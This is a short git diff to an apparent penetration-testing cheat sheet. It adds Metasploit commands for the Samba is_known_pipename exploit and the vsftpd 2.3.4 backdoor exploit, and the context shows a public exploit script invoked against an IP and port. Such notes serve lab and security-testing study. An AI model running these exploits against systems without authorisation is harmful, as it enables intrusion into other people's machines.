@@ -69,6 +69,7 @@ Ctrl + B 0 (1,2...) — Move to a specific window by number.
 - [ProFTPD 1.3.3c](#ProFTPD-133c)
 - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
 - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
+- [vsftpd 2.3.4](#vsftpd-234)
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
 
 ## ARP Poisoning
@@ -173,7 +174,14 @@ python 39161.py <ip> <port>
 ```
 
 ## Samba smbd 3.X - 4.X
+```
+use exploit/linux/samba/is_known_pipename
+```
 
+## vsftpd 2.3.4
+```
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
 
 ## Windows Cross-Compilation
 ```
